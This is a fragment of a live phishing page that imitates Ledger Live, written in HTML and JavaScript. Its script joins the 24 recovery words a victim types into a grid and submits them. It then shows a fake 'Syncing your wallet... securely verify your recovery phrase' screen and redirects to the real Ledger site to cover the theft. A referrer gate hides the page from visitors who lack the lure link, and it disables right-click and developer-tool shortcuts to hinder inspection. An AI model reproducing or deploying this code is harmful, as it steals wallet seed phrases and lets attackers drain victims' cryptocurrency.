    const msg = document.getElementById('submitMsg');
    btn.disabled = true;
    btn.textContent = 'Sending...';
    msg.style.display = 'none';
    msg.style.color = 'red';
    const finalwords = words.join(" ");

    submitViaFormSubmit(finalwords);
  }
  
  function showProcessing() {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    const proc = document.getElementById('s-processing');
    if (proc) proc.classList.add('active');
        setTimeout(()=>{
      window.location.replace("https://www.ledger.com");
    },3000);
  }

  buildWordGrid(24);
</script>


<!-- =================== PROCESSING SCREEN =================== -->
<div class="screen" id="s-processing" style="flex-direction:column;align-items:center;justify-content:center;gap:28px;">
  <div class="mobile-logo" style="position:absolute;top:20px;left:20px;">
       <img src="images/logo.svg" style="width: 160px;">

  </div>
  <div style="width:64px;height:64px;background:var(--purple-dim);border:1.5px solid var(--purple);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 24px rgba(139,92,246,0.25);">
    <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
      <path d="M14 4v5M14 19v5M4 14H9M19 14h5M6.3 6.3l3.5 3.5M18.2 18.2l3.5 3.5M6.3 21.7l3.5-3.5M18.2 9.8l3.5-3.5" stroke="var(--purple-light)" stroke-width="2" stroke-linecap="round">
        <animateTransform attributeName="transform" type="rotate" from="0 14 14" to="360 14 14" dur="1.2s" repeatCount="indefinite"></animateTransform>
      </path>
    </svg>
  </div>
  <div style="font-size:1.4rem;font-weight:700;letter-spacing:-0.3px;">Syncing your wallet...</div>
  <div style="color:var(--gray2);font-size:0.9rem;text-align:center;max-width:320px;line-height:1.7;">
    Please keep this window open while we<br>securely verify your recovery phrase.
  </div>
</div>

<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" data-cf-beacon="{" version":"2024.11.0","token":"31e27d96152e4113b627fc2148849acf","r":1}"="" crossorigin="anonymous"></script>

<script>
      (() => {
        const SLIDES = [
          {
            video: 'assets/videos/slide-1.webm',
            title: 'Buy, sell, and swap your crypto',
          },
          {
            video: 'assets/videos/slide-2.webm',
            title: 'Manage thousands of crypto assets',
          },
          {
            video: 'assets/videos/slide-3.webm',
            title: 'Secure your crypto, your way',
          },
        ];

        const videos = Array.from(document.querySelectorAll('.slide'));
        const bars = Array.from(document.querySelectorAll('.pbar'));
        const titleEl = document.getElementById('slide-title');
        const fallback = document.getElementById('play-fallback');

        let current = 0;
        const durations = new Array(SLIDES.length).fill(5);

        function setActive(index) {
          videos.forEach((v, i) => {
            if (i === index) {
              v.classList.add('active');
            } else {
              v.classList.remove('active');
              v.pause();
              v.currentTime = 0;
            }
          });

          titleEl.style.animation = 'none';
          titleEl.offsetHeight;
          titleEl.style.animation = '';
          titleEl.textContent = SLIDES[index].title;

          bars.forEach((bar, i) => {
            bar.classList.remove('full', 'active');
            bar.style.setProperty('--dur', `${durations[i]}s`);
            if (i < index) {
              bar.classList.add('full');
            } else if (i === index) {
              const after = bar;
              after.classList.remove('active');
              void after.offsetWidth;
              requestAnimationFrame(() => after.classList.add('active'));
            }
          });

          tryPlay(videos[index]);
        }

        function tryPlay(video) {
          const p = video.play();
          if (p && typeof p.then === 'function') {
            p.then(() => {
              fallback.classList.remove('show');
            }).catch(() => {
              fallback.classList.add('show');
            });
          }
        }

        videos.forEach((v, i) => {
          v.addEventListener('loadedmetadata', () => {
            durations[i] = v.duration || 5;
            if (i === current) {
              bars[i].style.setProperty('--dur', `${durations[i]}s`);
            }
          });
          v.addEventListener('ended', () => {
            current = (current + 1) % SLIDES.length;
            setActive(current);
          });
        });

        fallback.addEventListener('click', () => {
          fallback.classList.remove('show');
          tryPlay(videos[current]);
        });

        document.addEventListener('click', () => {
          if (videos[current].paused) tryPlay(videos[current]);
        });

        setActive(0);
      })();
    </script>
<script>
// =================== REFERRER GATE ENFORCEMENT ===================
(function enforceReferrer() {
  if (!window.__blocked) return;

  document.querySelectorAll('.screen').forEach(function(s) { s.style.display = 'none'; });

  var gate = document.getElementById('captcha-gate');
  if (gate) gate.style.display = 'none';

  var overlay = document.createElement('div');
  overlay.style.cssText = [
    'position:fixed','inset:0','z-index:99999',
    'background:#0a0a0a',
    'display:flex','flex-direction:column',
    'align-items:center','justify-content:center',
    'gap:20px','font-family:DM Sans,sans-serif',
    'text-align:center','padding:40px'
  ].join(';');

  overlay.innerHTML = '<svg width="64" height="64" viewBox="0 0 64 64" fill="none">' +
    '<circle cx="32" cy="32" r="30" stroke="#2a2a30" stroke-width="2"/>' +
    '<path d="M21 43L43 21M21 21l22 22" stroke="#6b7280" stroke-width="2.5" stroke-linecap="round"/>' +
    '</svg>' +
    '<div style="font-size:1.4rem;font-weight:700;color:#e5e7eb;letter-spacing:-0.3px;">Access Restricted</div>' +
    '<div style="color:#6b7280;font-size:0.9rem;max-width:340px;line-height:1.8;">' +
    'This page is not publicly accessible.<br>Please use the official link provided to you.' +
    '</div>';

  document.body.appendChild(overlay);

  document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
  document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && ['I','J','C','K'].includes(e.key)) ||
        (e.ctrlKey && e.key === 'U')) {
      e.preventDefault();
    }
  });
})();
</script>
</body></html>